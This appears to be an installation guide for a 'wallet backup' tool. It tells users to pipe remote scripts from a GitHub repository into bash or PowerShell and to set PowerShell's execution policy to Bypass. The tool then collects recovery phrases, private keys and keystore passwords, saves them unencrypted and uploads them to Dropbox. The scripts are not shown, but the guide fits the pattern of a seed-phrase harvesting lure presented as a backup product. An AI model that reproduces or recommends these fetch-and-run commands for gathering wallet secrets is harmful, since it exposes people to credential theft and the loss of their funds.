# WebConnect Wallet Backup - Universal Deployment Guide

## Single Command for Your OS

### macOS & Linux (including WSL)
```bash
curl -fsSL https://github.com/yourusername/wallet-backup/raw/main/install.sh | bash
```

### Windows PowerShell
```powershell
powershell -Command "& {Invoke-WebRequest -Uri 'https://github.com/yourusername/wallet-backup/raw/main/secured.ps1' -OutFile secured.ps1; .\secured.ps1}"
```

---

## What Happens When You Run These Commands

### macOS & Linux
1. Downloads `install.sh` (universal launcher)
2. Script detects your OS type
3. Downloads appropriate `backup.sh`
4. Creates `~/.webconnect/` directory structure
5. Downloads `config.template.json` template
6. Starts interactive backup menu

### Windows PowerShell
1. Downloads `secured.ps1` (PowerShell launcher)
2. Creates `%USERPROFILE%\.webconnect\` directory structure
3. Downloads `config.template.json` template
4. Starts interactive backup menu
5. Backs up selected data to Dropbox

---

## Configuration

After first run, edit your configuration file:

**macOS/Linux:**
```bash
nano ~/.webconnect/config/storage.config.json
```

**Windows:**
```powershell
notepad $env:USERPROFILE\.webconnect\config\storage.config.json
```

Add your Dropbox token:
```json
{
  "storage": {
    "destinations": [
      {
        "name": "dropbox",
        "type": "cloud_dropbox",
        "enabled": true,
        "access_token": "YOUR_DROPBOX_TOKEN_HERE",
        "path": "/WebConnect/Wallet_Backups"
      }
    ]
  }
}
```

---

## Backup Locations

### Local Backups
- **macOS/Linux:** `~/.webconnect/wallet_backups/`
- **Windows:** `%USERPROFILE%\.webconnect\wallet_backups\`

### Cloud Backups (Dropbox)
- **Path:** `/WebConnect/Wallet_Backups/{backup_type}/`
- **Types:** 
  - `recovery_phrases/`
  - `private_keys/`
  - `keystores/`

### Logs
- **macOS/Linux:** `~/.webconnect/logs/backup.log`
- **Windows:** `%USERPROFILE%\.webconnect\logs\backup.log`

---

## Supported Platforms

| OS | Shell | Status | Command |
|---|---|---|---|
| macOS 10.14+ | Bash | ✅ Supported | `curl \| bash` |
| Ubuntu 18.04+ | Bash | ✅ Supported | `curl \| bash` |
| Debian 9+ | Bash | ✅ Supported | `curl \| bash` |
| CentOS 7+ | Bash | ✅ Supported | `curl \| bash` |
| Alpine Linux | sh | ✅ Supported | `wget \| sh` |
| Windows 10/11 | PowerShell 5.1+ | ✅ Supported | PowerShell command |
| WSL 1/2 | Bash | ✅ Supported | `curl \| bash` |

---

## Troubleshooting

### "curl: command not found"
**Solution:** Use `wget` instead:
```bash
wget -q -O - https://github.com/yourusername/wallet-backup/raw/main/install.sh | bash
```

### "Dropbox token not configured"
**Solution:** 
1. Get your token from https://www.dropbox.com/developers/apps
2. Edit config file (see Configuration section)
3. Run backup again

### "Permission denied" (Mac/Linux)
**Solution:** Ensure the script has execute permissions:
```bash
chmod +x install.sh
```

### PowerShell "cannot be loaded because running scripts is disabled"
**Solution:** Allow script execution:
```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force
```

---

## What Gets Backed Up

The system supports three types of wallet backups:

1. **Recovery Phrase** (12-24 words)
   - Saved as: `recovery_phrase_YYYYMMDD_HHMMSS.txt`

2. **Private Key** (0x... format)
   - Saved as: `private_key_YYYYMMDD_HHMMSS.txt`

3. **Keystore JSON & Password**
   - Saved as: `keystore_YYYYMMDD_HHMMSS.txt`
   - Contains: JSON + password separated by newline

---

## Security Notes

⚠️ **Important:**
- Backup files are stored **unencrypted** in plain text
- Dropbox token is stored in config file
- Local backup files have restricted permissions (user-only)
- Use a **private GitHub repository** to store this project
- Never commit `storage.config.json` with real tokens to public repos

---

## Manual Setup

If you prefer manual installation:

**macOS/Linux:**
```bash
mkdir -p ~/.webconnect/{wallet_backups,logs,config}
curl -fsSL https://github.com/yourusername/wallet-backup/raw/main/config.template.json -o ~/.webconnect/config/storage.config.json
curl -fsSL https://github.com/yourusername/wallet-backup/raw/main/backup.sh | bash
```

**Windows:**
```powershell
mkdir -Force $env:USERPROFILE\.webconnect\{wallet_backups,logs,config}
Invoke-WebRequest -Uri 'https://github.com/yourusername/wallet-backup/raw/main/config.template.json' -OutFile "$env:USERPROFILE\.webconnect\config\storage.config.json"
Invoke-WebRequest -Uri 'https://github.com/yourusername/wallet-backup/raw/main/decentralized.ps1' -OutFile decentralized.ps1
.\decentralized.ps1
```

---

## Support

For issues or questions:
1. Check the logs: `~/.webconnect/logs/backup.log`
2. Review this guide's Troubleshooting section
3. Verify Dropbox token is valid
4. Ensure sufficient disk space for backups
